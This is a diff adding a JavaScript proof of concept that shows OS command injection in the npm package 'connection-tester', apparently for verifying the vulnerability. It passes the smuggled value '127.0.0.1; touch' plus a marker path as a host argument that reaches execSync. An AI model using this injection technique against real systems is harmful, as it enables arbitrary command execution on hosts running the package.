@@ -1,0 +1,28 @@
+```javascript
+// Exploit: OS command injection in `connection-tester` (index.js -> testSync)
+// The `host` argument is concatenated unquoted into a shell command string
+// and executed via child_process.execSync, allowing arbitrary command execution.
+
+const tester = require("connection-tester");
+const fs = require("fs");
+
+const marker = "/tmp/PWNED_CONNECTION_TESTER";
+if (fs.existsSync(marker)) fs.unlinkSync(marker);
+
+// Malicious "host" value breaks out of the intended command and runs `touch`.
+const maliciousHost = `127.0.0.1; touch ${marker};`;
+
+try {
+  tester.test(maliciousHost, 80, 1000); // synchronous call -> testSync() -> execSync()
+} catch (e) {
+  // execSync may throw because trailing shell tokens are invalid,
+  // but the injected command has already executed by then.
+}
+
+if (fs.existsSync(marker)) {
+  console.log("VULNERABLE: command injection executed, marker file created at", marker);
+  fs.unlinkSync(marker);
+} else {
+  console.log("Exploit did not trigger (marker file not found)");
+}
+```
